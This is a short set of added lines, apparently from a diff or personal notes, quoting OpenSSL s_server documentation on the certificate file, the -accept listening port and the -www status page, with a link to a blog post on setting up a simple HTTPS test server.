+The certificate to use, most servers cipher suites require the use of a certificate and some require a certificate with a certain public key type: for example the DSS cipher suites require a certificate containing a DSS (DSA) key. If not specified then the filename "server.pem" will be used.
+
+-accept 44330
+the TCP port to listen on for connections. If not specified 4433 is used.
+
+-www
+sends a status message back to the client when it connects. This includes lots of information about the ciphers used and various session parameters. The output is in HTML format so this option will normally be used with a web browser.
+
+#https://superhero.ninja/2015/07/22/create-a-simple-https-server-with-openssl-s_server/
+
+
+
+
+
